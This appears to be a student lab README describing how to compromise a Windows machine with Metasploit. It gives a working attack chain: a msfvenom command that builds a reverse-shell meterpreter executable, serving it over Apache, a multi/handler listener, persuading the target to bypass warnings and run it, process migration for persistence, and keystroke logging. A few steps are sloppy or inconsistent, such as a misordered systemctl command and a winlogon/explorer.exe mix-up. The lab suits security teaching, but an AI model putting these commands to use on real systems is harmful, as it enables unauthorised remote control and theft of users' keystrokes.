# Compromising-windows-using-Metasploit
# AIM:
To Compromise windows using Metasploit .
## DESIGN STEPS:

- `Step 1:` Install kali linux either in partition or virtual box or in live mode
- `Step 2:` Investigate on the various categories of tools as follows:
- `Step 3:` Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

![6 1](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/d0fb2e65-1527-4762-8c0f-0e034dec3c88)


Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe.

![6 2](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/25078038-f918-4e56-bf18-0a5abcd6718e)


copy the fun.exe into the apache /var/www/html folder

![6 3](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/34b9be7a-dfe5-47f9-bc61-df1d7381c1c2)


Start apache server sudo systemctl apache2 start

![6 4](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/0ea399d6-92f2-4e2d-b475-60eeb4af1e06)


Check the status of apache2

1

Invoke msfconsole:
msfconsole

![6 5](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/74e2edea-0d91-4231-b8e6-018d5e9c5e97)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![6 6](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/5d3d17d8-1fd5-4294-829c-bb0537179e37)


Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit css

![6 7](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/495e2474-3793-4ad3-82f4-dd78507e3d32)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![6 8](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/c55612a8-f6aa-4da3-a2d4-8f965bb84fbf)

Bypass any warning boxes, double-click the file, and allow it to run.

![6 9](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/9c88a83e-15af-4fd9-ba5b-42304560f01b)


On kali give the command exploit

![6 10](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/dd924c1b-4bd9-499b-ae28-575ed0c1693b)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![6 11](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/4637aaf1-84c8-404c-92f2-2a802390ad95)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted.

![6 12](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/a242c2d0-2800-4d13-a45e-163077a92ab6)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.





![6 13](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/bad43c3e-1687-44b7-a9f2-cba451835018)

![6 14](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/ab150802-eb0e-4eae-a034-eaf8a99467fa)



keyscan_dump Shows the keystrokes captured so far.


![6 15](https://github.com/SaiPraneeth04/Compromising-windows-using-Metasploit/assets/119390353/57cf659b-0eea-4a72-acb3-9ef092fd8f74)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
